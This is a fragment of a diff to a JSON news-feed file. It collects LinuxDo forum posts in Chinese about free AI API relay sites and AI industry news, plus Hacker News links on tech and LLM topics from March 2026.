+      "summary": "本帖使用社区公益推广，符合推广要求。我申明并遵循社区要求的以下内容：\n\n我的项目是免费使用的，无收费（变相收费、赞助）部分： 是\n我的帖子已经打上 公益推广 标签： 是\n我的项目属于个人项目，与公司或商业机构无关： 是\n我的项目不存在QQ、TG等群组引流： 是\n我的项目不存在非运营必要的网站引流： 是\n我的项目不存在为他人推广、AFF： 是\n我的项目无关联的商业项目： 是\n我的站点存在登录，并已接入 LINUX DO Connect： 是\n我帖子内的项目介绍，AI生成、润色内容部分已截图发出： 是\n以上选择我承诺是永久有效的，接受社区和佬友监督： 是\n\n以下为项目介绍正文内容，AI生成、润色内容已使用截图方式发出\n\n昨天下午佬友们帮忙测试，但是我那个帖子没带模板被删了，重新发一下吧\n地址:https://newapi.zhenhaoji.qzz.io\n可用模型：\n\n重点说明：针对 cursor2api 做了优化，现在站上看到的 opus 是cursor2api的 sonnet4.6\n佬们登吧，主要是为了兼容 cc 才这么做，不要在反复问我真假 opus 了。\n昨天一下午就跑了接近 10"
+    },
+    {
+      "title": "嘿嘿升三级了！",
+      "link": "https://linux.do/t/topic/1795252",
+      "published": "Sat, 21 Mar 2026 23:47:23 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "终于在进站的第五十天升三级了，啊哈哈哈，开始探索三级专属区…\n这五十天在l站学了不少东西，也有很多很适合小白的教程，这里再应援一下始皇的口号：\n学AI,上L站！\n            11 个帖子 - 11 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "OpenAI计划将员工人数翻一番",
+      "link": "https://linux.do/t/topic/1795248",
+      "published": "Sat, 21 Mar 2026 23:43:09 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "https://www.ft.com/content/7ffea5b4-e8bc-47cd-adb4-257f84c8028b?syn-25a6b1a6=1\n\nOpenAI计划在今年年底前将其员工人数增加近一倍，以加快向企业销售产品的步伐，并在价值数千亿美元的市场竞争中追赶竞争对手Anthropic。\n据两位直接了解此事的人士透露，这家估值 7300 亿美元的初创公司计划将员工人数从目前的约 4500 人增加到约 8000 人。\n据知情人士透露，新员工将主要从事产品开发、工程、研究和销售等工作。OpenAI还将加大力度招聘专家，专注于该公司所谓的“技术大使”工作，帮助企业更好地利用其工具。\nOpenAI 已签署旧金山办公室的新租赁协议，使其在该市的办公面积超过 100 万平方英尺，并准备在今年每天增加约 12 名员工。\n此次招聘活动是人工智能集团战略调整的一部分，旨在遏制 Anthropic 在企业客户中的增长势头，并抵御来自谷歌日益激烈的竞争。\n根据支付初创公司 Ramp 超过 5 万名客户的信用卡和账单数据显示，首次购买AI 的企业客户选择 Anthropic 的比例是 OpenA"
+    },
+    {
+      "title": "【满了】【冰の公益站】纯GPT站点 支持5.3 5.4",
+      "link": "https://linux.do/t/topic/1795246",
+      "published": "Sat, 21 Mar 2026 23:42:28 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "本帖使用社区公益推广，符合推广要求。我申明并遵循社区要求的以下内容：\n\n我的项目是免费使用的，无收费（变相收费、赞助）部分： 是\n我的帖子已经打上 公益推广 标签： 是\n我的项目属于个人项目，与公司或商业机构无关： 是\n我的项目不存在QQ、TG等群组引流： 是\n我的项目不存在非运营必要的网站引流： 是\n我的项目不存在为他人推广、AFF： 是\n我的项目无关联的商业项目： 是\n我的站点存在登录，并已接入 LINUX DO Connect： 是\n我帖子内的项目介绍，AI生成、润色内容部分已截图发出： 是\n以上选择我承诺是永久有效的，接受社区和佬友监督： 是\n\n以下为项目介绍正文内容，AI生成、润色内容已使用截图方式发出\n\n链接：https://ice.v.ua/\n小而精 全自动补号 号池维持在130个号左右\n注册送200刀 用完即补 大概容纳100活跃用户左右关闭注册\nSun, Mar 22, 2026 8:54 AM CST 注册已关闭\n            93 个帖子 - 88 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "每天都离不开any大善人，希望今天的429早点结束😭",
+      "link": "https://linux.do/t/topic/1795245",
+      "published": "Sat, 21 Mar 2026 23:42:17 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "佬友们周末这么早就开始蹬了吗，any大善人我又用不了了 \n\n            12 个帖子 - 10 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "DoorDash 推出一款新的“task”应用，付费给快递员提交视频以训练 AI",
+      "link": "https://linux.do/t/topic/1795241",
+      "published": "Sat, 21 Mar 2026 23:37:58 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "TechCrunch – 19 Mar 26\n  \n\n  \n    \n\nDoorDash launches a new 'Tasks' app that pays couriers to submit videos to...\n\n  Delivery couriers will be able to earn money by completing activities like filming everyday tasks or recording themselves speaking in another language.\n\n  \n    Est. reading time: 3 minutes\n  \n\n  \n\n  \n    \n    \n  \n\n  \n\n\n\nDoorDash周四宣布，将推出一款全新的独立“任务”应用，允许公司支付快递员费用，以完成旨在改进人工智能和机器人系统的任务。DoorDash表示，快递员可以通过完成拍摄日常任务或录制自己用另一种语言交流的活动来赚钱。\nDoorDash在博客中写道：“这些数据帮助人工智能和机器人系统理解物理世界。”报酬是根据活动的努力和复杂"
+    },
+    {
+      "title": "怎么现在失败主义谋士那么多啊，什么国内外对比别说还没盖棺，就已经开始反思、扣帽子了。",
+      "link": "https://linux.do/t/topic/1795239",
+      "published": "Sat, 21 Mar 2026 23:37:08 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "在弱项也就罢了，明明不说全面领先吧，在对方先发的情况下，好歹也是一个中美梯队互殴的……\n（有差距也是能对拳的级别）\n更别说欧日韩连桌都没上，好歹发达国家，是要开除人籍吗（还不如俄印呢）。\n颇有种宇树当年在屑站发评论招人被群起围攻的感觉。\n还什么骗钱跟风圈钱的帽子都来，基本除了API都没地方充钱……好吧其实只是看某些帖子是在难绷，到也不止是AI领域，其他很多领域都有点这个意思，只不过AI这方面实在难绷。对面上万亿投资还作为核心战略重点先发深耕多年，我朝吃制裁封锁的情况下还能群雄并起，就很能说明问题了吧。什么揠苗助长都来了，你拔剑四顾一下……其他国家几个有苗的？\n还搁着复读蒸馏走捷径，所以水平不行，claude回答自己是deepseek的时候怎么不说了？\n那不走捷径的冥主创新，不受制裁封锁的闭源模型grok（光一批训练用GPU采购就至少百亿美刀级别），你关了搜索，还经常被我国闭源暴打呢。那是更不努力咯？\n一股但凡我朝有点突破，就开始“一定是偷窝滴技术！拆腻子人不可能研发出来”经典酸味（典中典）\n\n国外闭源冥主，国内开源原罪是吧？\n实在难绷，血压UPUPUP↑\n（错别字编辑一下）\n     "
+    },
+    {
+      "title": "Profiling Hacker News users based on their comments",
+      "link": "https://simonwillison.net/2026/Mar/21/profiling-hacker-news-users/",
+      "published": "Sun, 22 Mar 2026 00:30:19 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://simonwillison.net/2026/Mar/21/profiling-hacker-news-users/\nComments URL: https://news.ycombinator.com/item?id=47473086\nPoints: 14\n# Comments: 4"
+    },
+    {
+      "title": "Storing 2 bytes of data in your Logitech mouse",
+      "link": "https://www.timwehrle.de/blog/what-if-i-stored-data-in-my-mouse/",
+      "published": "Sat, 21 Mar 2026 23:26:53 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://www.timwehrle.de/blog/what-if-i-stored-data-in-my-mouse/\nComments URL: https://news.ycombinator.com/item?id=47472630\nPoints: 10\n# Comments: 5"
+    },
+    {
+      "title": "The Impact of AI on Game Dev Jobs. Open to Work Crisis",
+      "link": "https://darkounity.com/blog-post?id=the-impact-of-ai-on-game-dev-jobs-open-to-work-crisis--1774128585922",
+      "published": "Sat, 21 Mar 2026 22:03:05 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://darkounity.com/blog-post?id=the-impact-of-ai-on-game-dev-jobs-open-to-work-crisis--1774128585922\nComments URL: https://news.ycombinator.com/item?id=47471943\nPoints: 27\n# Comments: 6"
+    },
+    {
+      "title": "Floci – A free, open-source local AWS emulator",
+      "link": "https://github.com/hectorvent/floci",
+      "published": "Sat, 21 Mar 2026 21:49:15 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://github.com/hectorvent/floci\nComments URL: https://news.ycombinator.com/item?id=47471801\nPoints: 42\n# Comments: 5"
+    },
+    {
+      "title": "Professional video editing, right in the browser with WebGPU and WASM",
+      "link": "https://tooscut.app/",
+      "published": "Sat, 21 Mar 2026 21:27:50 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://tooscut.app/\nComments URL: https://news.ycombinator.com/item?id=47471601\nPoints: 108\n# Comments: 27"
+    },
+    {
+      "title": "Do Not Turn Child Protection into Internet Access Control",
+      "link": "https://news.dyne.org/child-protection-is-not-access-control/",
+      "published": "Sat, 21 Mar 2026 20:32:20 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://news.dyne.org/child-protection-is-not-access-control/\nComments URL: https://news.ycombinator.com/item?id=47470991\nPoints: 433\n# Comments: 195"
+    },
+    {
+      "title": "Tinybox – Offline AI device 120B parameters",
+      "link": "https://tinygrad.org/#tinybox",
+      "published": "Sat, 21 Mar 2026 20:08:37 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://tinygrad.org/#tinybox\nComments URL: https://news.ycombinator.com/item?id=47470773\nPoints: 265\n# Comments: 156"
+    },
+    {
+      "title": "No evidence cannabis helps anxiety, depression, or PTSD",
+      "link": "https://www.sciencedaily.com/releases/2026/03/260319044656.htm",
+      "published": "Sat, 21 Mar 2026 20:05:58 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://www.sciencedaily.com/releases/2026/03/260319044656.htm\nComments URL: https://news.ycombinator.com/item?id=47470750\nPoints: 146\n# Comments: 122"
+    },
+    {
+      "title": "Common Lisp Development Tooling",
+      "link": "https://www.creativetension.co/posts/common-lisp-development-tooling",
+      "published": "Sat, 21 Mar 2026 20:04:08 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://www.creativetension.co/posts/common-lisp-development-tooling\nComments URL: https://news.ycombinator.com/item?id=47470734\nPoints: 30\n# Comments: 2"
+    },
+    {
+      "title": "Show HN: Atomic – self-hosted, semantically-connected personal knowledge base",
+      "link": "https://github.com/kenforthewin/atomic",
+      "published": "Sat, 21 Mar 2026 19:31:39 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://github.com/kenforthewin/atomic\nComments URL: https://news.ycombinator.com/item?id=47470433\nPoints: 38\n# Comments: 7"
+    },
+    {
+      "title": "Show HN: Termcraft – terminal-first 2D sandbox survival in Rust",
+      "link": "https://github.com/pagel-s/termcraft",
+      "published": "Sat, 21 Mar 2026 18:42:38 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "I’ve been building termcraft, a terminal-first 2D sandbox survival game in Rust.The idea is to take the classic early survival progression and adapt it to a side-on terminal format instead of a tile or pixel-art engine.Current build includes:\n  - procedural Overworld, Nether, and End generation\n  - mining, placement, crafting, furnaces, brewing, and boats\n  - hostile and passive mobs\n  - villages, dungeons, strongholds, Nether fortresses, and dragon progressionThis is still early alpha, but it’s"
+    },
+    {
+      "title": "Hide macOS Tahoe's Menu Icons",
+      "link": "https://512pixels.net/2026/03/hide-macos-tahoes-menu-icons-with-this-one-simple-trick/",
+      "published": "Sat, 21 Mar 2026 17:46:00 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://512pixels.net/2026/03/hide-macos-tahoes-menu-icons-with-this-one-simple-trick/\nComments URL: https://news.ycombinator.com/item?id=47469331\nPoints: 88\n# Comments: 25"
+    },
+    {
+      "title": "Seam carving with forward energy",
+      "link": "https://pictolab.io/seam-carving",
+      "published": "Sat, 21 Mar 2026 17:03:32 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://pictolab.io/seam-carving\nComments URL: https://news.ycombinator.com/item?id=47468849\nPoints: 11\n# Comments: 2"
+    },
+    {
+      "title": "Thinking Fast, Slow, and Artificial: How AI Is Reshaping Human Reasoning",
+      "link": "https://papers.ssrn.com/sol3/papers.cfm?abstract_id=6097646",
+      "published": "Sat, 21 Mar 2026 15:30:29 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://papers.ssrn.com/sol3/papers.cfm?abstract_id=6097646\nComments URL: https://news.ycombinator.com/item?id=47467913\nPoints: 85\n# Comments: 49"
+    },
+    {
+      "title": "Show HN: Joonote – A note-taking app on your lock screen and notification panel",
+      "link": "https://joonote.com/",
+      "published": "Sat, 21 Mar 2026 15:02:30 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "I finally built this app after many years of being sick of unlocking my phone every goddamn time I need to take or view my notes. It particularly sucks when I'm doing my grocery and going down the list.I started building last year June. This is a native app written in Kotlin. And since I'm a 100% Web dev guy, I gotta say this wouldn't have been possible without this AI to assist me. So this isn't \"vibe-coded\". I simply used the chat interface in Gemini website, manually copy paste codes to build"
+    },
+    {
+      "title": "How Ford burned $12B in Brazil (2021)",
+      "link": "https://www.reuters.com/business/autos-transportation/how-ford-burned-12-billion-brazil-2021-05-20/",
+      "published": "Sat, 21 Mar 2026 14:55:42 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://www.reuters.com/business/autos-transportation/how-ford-burned-12-billion-brazil-2021-05-20/\nComments URL: https://news.ycombinator.com/item?id=47467623\nPoints: 17\n# Comments: 0"
+    },
+    {
+      "title": "Grafeo – A fast, lean, embeddable graph database built in Rust",
+      "link": "https://grafeo.dev/",
+      "published": "Sat, 21 Mar 2026 14:50:18 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://grafeo.dev/\nComments URL: https://news.ycombinator.com/item?id=47467567\nPoints: 183\n# Comments: 59"
+    },
+    {
+      "title": "Some things just take time",
+      "link": "https://lucumr.pocoo.org/2026/3/20/some-things-just-take-time/",
+      "published": "Sat, 21 Mar 2026 14:46:56 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://lucumr.pocoo.org/2026/3/20/some-things-just-take-time/\nComments URL: https://news.ycombinator.com/item?id=47467537\nPoints: 488\n# Comments: 167"
+    },
+    {
+      "title": "Ubuntu 26.04 Ends 46 Years of Silent sudo Passwords",
+      "link": "https://pbxscience.com/ubuntu-26-04-ends-46-years-of-silent-sudo-passwords/",
+      "published": "Sat, 21 Mar 2026 05:06:11 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://pbxscience.com/ubuntu-26-04-ends-46-years-of-silent-sudo-passwords/\nComments URL: https://news.ycombinator.com/item?id=47464134\nPoints: 307\n# Comments: 311"
+    },
+    {
+      "title": "A Japanese glossary of chopsticks faux pas (2022)",
+      "link": "https://www.nippon.com/en/japan-data/h01362/",
+      "published": "Fri, 20 Mar 2026 20:54:57 +0000",
+      "source": "Hacker News Front Page",
+      "summary": "Article URL: https://www.nippon.com/en/japan-data/h01362/\nComments URL: https://news.ycombinator.com/item?id=47460452\nPoints: 458\n# Comments: 352"
+    },
+    {
+      "title": "Yeah: LLM-powered yes/no CLI tool",
+      "link": "https://github.com/crawshaw/yeah",
+      "published": "Sat, 21 Mar 2026 22:46:03 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://github.com/crawshaw/yeah\nComments URL: https://news.ycombinator.com/item?id=47472301\nPoints: 5\n# Comments: 0"
+    },
+    {
+      "title": "Show HN: GoldenMatch – Entity resolution with LLM scoring, 97% F1, no Spark",
+      "link": "https://github.com/benzsevern/goldenmatch",
+      "published": "Sat, 21 Mar 2026 21:02:25 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://github.com/benzsevern/goldenmatch\nComments URL: https://news.ycombinator.com/item?id=47471317\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "LLM Smart Router",
+      "link": "https://github.com/tumf/kani",
+      "published": "Sat, 21 Mar 2026 14:40:55 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://github.com/tumf/kani\nComments URL: https://news.ycombinator.com/item?id=47467478\nPoints: 1\n# Comments: 0"
+    },
+    {
+      "title": "A Portrait of the Artist as an LLM",
+      "link": "https://evernotquite.substack.com/p/a-portrait-of-the-artist-as-an-llm",
+      "published": "Sat, 21 Mar 2026 14:31:27 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://evernotquite.substack.com/p/a-portrait-of-the-artist-as-an-llm\nComments URL: https://news.ycombinator.com/item?id=47467379\nPoints: 5\n# Comments: 0"
+    },
+    {
+      "title": "Using local LLM and Ghidra to analyze malware",
+      "link": "https://discounttimu.substack.com/p/using-llm-and-ghidra-to-analyze-malware",
+      "published": "Sat, 21 Mar 2026 14:29:42 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://discounttimu.substack.com/p/using-llm-and-ghidra-to-analyze-malware\nComments URL: https://news.ycombinator.com/item?id=47467365\nPoints: 3\n# Comments: 1"
+    },
+    {
+      "title": "The Risk of LLM-Generated Administrative Scripts in Privileged Environments",
+      "link": "https://zenodo.org/records/18718481",
+      "published": "Sat, 21 Mar 2026 14:22:57 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://zenodo.org/records/18718481\nComments URL: https://news.ycombinator.com/item?id=47467304\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "Show HN: RSS reader that scores articles 0–10 with LLM before you open them",
+      "link": "https://github.com/Tutanka01/makhalReader",
+      "published": "Sat, 21 Mar 2026 12:08:48 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://github.com/Tutanka01/makhalReader\nComments URL: https://news.ycombinator.com/item?id=47466304\nPoints: 2\n# Comments: 2"
+    },
+    {
+      "title": "Show HN: Elastik – treating LLM as an HTTP client in less than 200 lines of code",
+      "link": "https://github.com/rangersui/Elastik",
+      "published": "Sat, 21 Mar 2026 06:01:27 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Elastik is treating LLM as an untrustworthy http client by using mcp as a transparent transportation layer and built the most basic model with a html, database and a server.I'm using the web security principle to treat this untrustworthy client(LLM) and provide it with the ability every http client can do, so that LLM can write any web app natively without any agentic UI or predefined components, in a safe, physical isolated way.\n\nComments URL: https://news.ycombinator.com/item?id=47464379\nPoint"
+    },
+    {
+      "title": "MacinAI Local: Building a Model-Agnostic LLM Inference Engine for Mac OS 9",
+      "link": "https://oldapplestuff.com/blog/MacinAI-Local/",
+      "published": "Sat, 21 Mar 2026 02:03:03 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://oldapplestuff.com/blog/MacinAI-Local/\nComments URL: https://news.ycombinator.com/item?id=47463324\nPoints: 1\n# Comments: 0"
+    },
+    {
+      "title": "Court Asked for the LLM's Reasoning. The Company Had Nothing. $10M",
+      "link": "https://pub.towardsai.net/the-air-gapped-chronicles-the-court-asked-for-the-llms-reasoning-48471090eada",
+      "published": "Sat, 21 Mar 2026 00:32:48 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://pub.towardsai.net/the-air-gapped-chronicles-the-court-asked-for-the-llms-reasoning-48471090eada\nComments URL: https://news.ycombinator.com/item?id=47462766\nPoints: 5\n# Comments: 1"
+    },
+    {
+      "title": "Covenant-72B is the largest decentralized LLM pre-training run in history",
+      "link": "https://twitter.com/opentensor/status/2032567840189096404",
+      "published": "Fri, 20 Mar 2026 21:39:57 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://twitter.com/opentensor/status/2032567840189096404\nComments URL: https://news.ycombinator.com/item?id=47460991\nPoints: 10\n# Comments: 0"
+    },
+    {
+      "title": "Wikipedia RFC on banning LLM contributions",
+      "link": "https://en.wikipedia.org/wiki/Wikipedia:Writing_articles_with_large_language_models/RfC",
+      "published": "Fri, 20 Mar 2026 18:30:38 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://en.wikipedia.org/wiki/Wikipedia:Writing_articles_with_large_language_models/RfC\nComments URL: https://news.ycombinator.com/item?id=47458671\nPoints: 47\n# Comments: 2"
+    },
+    {
+      "title": "The Missing Memory Hierarchy: Demand Paging for LLM Context Windows",
+      "link": "https://arxiv.org/abs/2603.09023",
+      "published": "Fri, 20 Mar 2026 17:49:23 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://arxiv.org/abs/2603.09023\nComments URL: https://news.ycombinator.com/item?id=47458096\nPoints: 3\n# Comments: 0"
+    },
+    {
+      "title": "Loom: An LLM agent framework for Go",
+      "link": "https://github.com/teradata-labs/loom",
+      "published": "Fri, 20 Mar 2026 17:31:11 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://github.com/teradata-labs/loom\nComments URL: https://news.ycombinator.com/item?id=47457821\nPoints: 4\n# Comments: 0"
+    },
+    {
+      "title": "LLM evals test outputs. Rarely whether the model understood first",
+      "link": "https://github.com/NoxionAI/comprehension-score",
+      "published": "Fri, 20 Mar 2026 16:56:17 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://github.com/NoxionAI/comprehension-score\nComments URL: https://news.ycombinator.com/item?id=47457323\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "We decreased our LLM costs by switching to Opus",
+      "link": "https://www.mendral.com/blog/frontier-model-lower-costs",
+      "published": "Fri, 20 Mar 2026 14:40:12 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://www.mendral.com/blog/frontier-model-lower-costs\nComments URL: https://news.ycombinator.com/item?id=47455239\nPoints: 1\n# Comments: 0"
+    },
+    {
+      "title": "LLM is not going to replace software engineers, here's why",
+      "link": "https://fangpenlin.com/posts/2026/03/19/no-llm-is-not-going-to-replace-software-engineers-heres-why/",
+      "published": "Fri, 20 Mar 2026 14:22:33 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://fangpenlin.com/posts/2026/03/19/no-llm-is-not-going-to-replace-software-engineers-heres-why/\nComments URL: https://news.ycombinator.com/item?id=47454965\nPoints: 3\n# Comments: 1"
+    },
+    {
+      "title": "Ask HN: I don't want a single LLM I use to be involved in making war",
+      "link": "https://news.ycombinator.com/item?id=47454946",
+      "published": "Fri, 20 Mar 2026 14:21:21 +0000",
+      "source": "Hacker News LLM",
+      "summary": "In light of the recent disputes between Anthropic and the Pentagon, I'd like to know if anyone is aware of any initiatives (signature collections or otherwise) to ban or discourage the use of LLMs for war purposes.This should be made clear by all researchers/founders/investors: \"I don't want my AI used to facilitate war situations.\"Is there a manifesto or similar on this matter?\n\nComments URL: https://news.ycombinator.com/item?id=47454946\nPoints: 2\n# Comments: 1"
+    },
+    {
+      "title": "MacinAI Local: Building a Model-Agnostic LLM Inference Engine for Mac OS 9",
+      "link": "https://oldapplestuff.com/blog/MacinAI-Local/",
+      "published": "Fri, 20 Mar 2026 14:09:13 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://oldapplestuff.com/blog/MacinAI-Local/\nComments URL: https://news.ycombinator.com/item?id=47454765\nPoints: 3\n# Comments: 0"
+    },
+    {
+      "title": "LLM Terminology explained simply: Weights, Inference, Effective sequence length",
+      "link": "https://devforth.io/insights/llm-terminology-guide-weights-inference-effective-sequence-length-and-self-hosting-explained/",
+      "published": "Fri, 20 Mar 2026 13:53:45 +0000",
+      "source": "Hacker News LLM",
+      "summary": "Article URL: https://devforth.io/insights/llm-terminology-guide-weights-inference-effective-sequence-length-and-self-hosting-explained/\nComments URL: https://news.ycombinator.com/item?id=47454509\nPoints: 4\n# Comments: 1"
+    },
+    {
+      "title": "What Do Coders Do After AI?",
+      "link": "https://www.anildash.com/2026/03/13/coders-after-ai/",
+      "published": "Sun, 22 Mar 2026 00:33:37 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.anildash.com/2026/03/13/coders-after-ai/\nComments URL: https://news.ycombinator.com/item?id=47473107\nPoints: 1\n# Comments: 0"
+    },
+    {
+      "title": "AI and the PhD student: friend or foe?",
+      "link": "https://www.nature.com/articles/d41586-026-00843-y",
+      "published": "Sun, 22 Mar 2026 00:30:58 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.nature.com/articles/d41586-026-00843-y\nComments URL: https://news.ycombinator.com/item?id=47473091\nPoints: 1\n# Comments: 0"
+    },
+    {
+      "title": "AI coding agents run shell commands with no audit trail. I built a fix",
+      "link": "https://www.oculisecurity.com/",
+      "published": "Sat, 21 Mar 2026 23:55:49 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.oculisecurity.com/\nComments URL: https://news.ycombinator.com/item?id=47472845\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "Dissociating Direct Access from Inference in AI Introspection",
+      "link": "https://arxiv.org/abs/2603.05414",
+      "published": "Sat, 21 Mar 2026 23:50:44 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://arxiv.org/abs/2603.05414\nComments URL: https://news.ycombinator.com/item?id=47472809\nPoints: 3\n# Comments: 0"
+    },
+    {
+      "title": "Goalless AI Agents: What They Build When No One Is Watching",
+      "link": "https://changkun.substack.com/p/goalless-agents",
+      "published": "Sat, 21 Mar 2026 23:36:02 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://changkun.substack.com/p/goalless-agents\nComments URL: https://news.ycombinator.com/item?id=47472694\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "Using AI makes writing more bland, study finds",
+      "link": "https://www.nbcnews.com/tech/tech-news/ai-changing-style-substance-human-writing-study-finds-rcna263789",
+      "published": "Sat, 21 Mar 2026 23:35:46 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.nbcnews.com/tech/tech-news/ai-changing-style-substance-human-writing-study-finds-rcna263789\nComments URL: https://news.ycombinator.com/item?id=47472690\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "Before You Adapt to AI… Watch This",
+      "link": "https://www.youtube.com/watch?v=k51k2AyUpao",
+      "published": "Sat, 21 Mar 2026 23:30:40 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.youtube.com/watch?v=k51k2AyUpao\nComments URL: https://news.ycombinator.com/item?id=47472659\nPoints: 3\n# Comments: 2"
+    },
+    {
+      "title": "Inside the AI labs training China's humanoid robots",
+      "link": "https://www.ft.com/content/85bca5c7-f64b-4011-bc7c-9ce3254a2b78",
+      "published": "Sat, 21 Mar 2026 23:16:01 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.ft.com/content/85bca5c7-f64b-4011-bc7c-9ce3254a2b78\nComments URL: https://news.ycombinator.com/item?id=47472535\nPoints: 3\n# Comments: 0"
+    },
+    {
+      "title": "AI systems are more similar to indent(1), than to the human process",
+      "link": "https://marc.info/?l=openbsd-tech&m=177411863202734&w=2",
+      "published": "Sat, 21 Mar 2026 23:04:41 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://marc.info/?l=openbsd-tech&amp;m=177411863202734&amp;w=2\nComments URL: https://news.ycombinator.com/item?id=47472455\nPoints: 4\n# Comments: 1"
+    },
+    {
+      "title": "AI models know they are guessing before they generate text",
+      "link": "https://www.orsonai.com/publications/tes1-pre-generative-epistemic-signal.html",
+      "published": "Sat, 21 Mar 2026 23:01:43 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.orsonai.com/publications/tes1-pre-generative-epistemic-signal.html\nComments URL: https://news.ycombinator.com/item?id=47472425\nPoints: 4\n# Comments: 0"
+    },
+    {
+      "title": "AI for Particle Physics: Searching for Anomalies",
+      "link": "https://spectrum.ieee.org/particle-physics-ai",
+      "published": "Sat, 21 Mar 2026 22:57:18 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://spectrum.ieee.org/particle-physics-ai\nComments URL: https://news.ycombinator.com/item?id=47472392\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "AI Chatbots Keep Encouraging Violence. That's by Design",
+      "link": "https://weaponizedspaces.substack.com/p/ai-chatbots-keep-encouraging-violence",
+      "published": "Sat, 21 Mar 2026 22:55:50 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://weaponizedspaces.substack.com/p/ai-chatbots-keep-encouraging-violence\nComments URL: https://news.ycombinator.com/item?id=47472384\nPoints: 4\n# Comments: 0"
+    },
+    {
+      "title": "Manufacturing Legitimacy in the AI era ($8M fraud)",
+      "link": "https://om.co/2026/03/21/manufacturing-legitimacy-in-the-ai-era/",
+      "published": "Sat, 21 Mar 2026 22:42:12 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://om.co/2026/03/21/manufacturing-legitimacy-in-the-ai-era/\nComments URL: https://news.ycombinator.com/item?id=47472272\nPoints: 3\n# Comments: 0"
+    },
+    {
+      "title": "AI wants your soul. I just want your long link",
+      "link": "https://tiras.pro",
+      "published": "Sat, 21 Mar 2026 22:29:10 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://tiras.pro\nComments URL: https://news.ycombinator.com/item?id=47472200\nPoints: 2\n# Comments: 0"
+    },
+    {
+      "title": "The Impact of AI on Game Dev Jobs. Open to Work Crisis",
+      "link": "https://darkounity.com/blog-post?id=the-impact-of-ai-on-game-dev-jobs-open-to-work-crisis--1774128585922",
+      "published": "Sat, 21 Mar 2026 22:03:05 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://darkounity.com/blog-post?id=the-impact-of-ai-on-game-dev-jobs-open-to-work-crisis--1774128585922\nComments URL: https://news.ycombinator.com/item?id=47471943\nPoints: 27\n# Comments: 6"
+    },
+    {
+      "title": "US to embed Palantir AI across military",
+      "link": "https://thecradle.co/articles-id/36667",
+      "published": "Sat, 21 Mar 2026 21:33:10 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://thecradle.co/articles-id/36667\nComments URL: https://news.ycombinator.com/item?id=47471655\nPoints: 14\n# Comments: 10"
+    },
+    {
